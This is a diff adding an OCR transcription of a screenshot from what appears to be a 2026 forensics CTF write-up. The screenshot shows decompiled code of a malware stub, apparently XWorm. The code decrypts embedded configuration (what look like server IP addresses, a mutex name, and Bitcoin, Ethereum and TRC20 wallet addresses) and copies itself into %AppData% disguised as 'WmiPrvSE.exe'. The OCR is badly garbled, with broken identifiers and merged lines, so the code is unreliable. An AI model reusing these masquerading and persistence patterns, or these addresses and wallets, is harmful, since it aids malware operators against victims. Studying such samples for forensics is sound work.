@@ -1,0 +1,34 @@
+# OCR: Pasted_image_20260415230738.webp
+# 来源: ./02-WriteUp/2026/2026-平航杯/Pasted_image_20260415230738.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:44
+
+15 16 17 18 19 20 21 22 23 24 25
+27 28 29 30 31 32 33 34 35 36 37 38
+40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69
+namespace
+Stub
+/ Token: 0x02000008 RID: 8 public class Main
+// Token: 0x06000026 RID: 38[STAThread]
+public static void EntryPoint()
+Thread. Sleep(checked(statics.int 3 * 1000)) trv
+statics. 156. 238. 239. 253, 66. 175.239.149, 185. 117.249. 43 = Conversions. TString(AEsDecryptor. Decrypt(statics. 156. 238. 239. 253, 66. 175.239. 149, 185. 117. 249. 43)) statics.7o0 = Conversions.ToString(AEsDecryptor.Decrypt(statics.7ooo)):
+statics.<123456789> = Conversions. ToString(AEsDecryptor. Decrypt(statics.<123456789>)): statics.<Xwormum> = Conversions.Tostring(AEsDecrvptor.Decrypt(statics.<Xwormum>)):
+statics. Default = Conversions. ToString(AEsDecryptor.Decrypt(statics. Default)): statics. UsB. exe = Conversions. Tostring(AEsDecryptor. Decrypt(statics. UsB. exe))
+statics.%AppData% = Environment.ExpandEnvironmentVariables(Conversions.ToString(AEsDecryptor.Decrypt(statics.%AppData%))) statics.WmiPrvsE.exe = Conversions.Tostring(AEsDecryptor.Decrypt(statics.WmiPrvsE.exe)) :
+statics.bclq2a4jgxwslng5khwvzkt9pechms20ghff42s5g = Conversions.ToString(AEsDecryptor.Decrypt(statics.bclq2a4jgxslng5khwvzkt9pechms20ghff42s5g)) : statics.0x10cE3E5678f40f0B94A2fB5003f04012ecA407C5 = Conversions.ToString(AESDecryptor.Decrypt(statics.0x10cE3E5678f40f0B94A2fB5003f04012ecA407C5)): statics.TRc20_Address = Conversions.ToString(AEsDecryptor.Decrypt(statics.TRc20_Address)):
+catch (Exception ex)
+Environment.Exit(o)
+if(!ACXQgTIzEzg4QgP5gFxb.6NEoy1ymZv4FH17VRKK3
+Environment.Exit(o)
+try
+Main.AuPSZXXVSMF0DQRCvC2rt5MfcrYC48o7K01SI69og2JLhf02Th6Xma2H0ysYO catch (Exception ex2)
+Main. j4d5GNXICPEVRtyjnlgCMXk7jToiY6J1As5nLQFxfcp708CM7Hr1XTxfCBg(
+string text = statics.%AppData% + " try
+ + statics.WmiPrvsE.exe:
+object fullName = new FileInfo(text).Directory.FullName: if (!Directory.Exists(Conversions.Tostring(fuliName)))
+Directory.CreateDirectory(Conversions.ToString(fuliName))
+if (File.Exists(text))
+FileInfo fileInfo = new FileInfo(text) fileInfo.Delete(O:
+Thread. Sleep(1000):
+File.WriteAl1Bytes(text, File.ReadAliBytes(ACXOqTJzEzq40qP5qFxb.8qgIc9ClrZ7T3TBLTgSV))
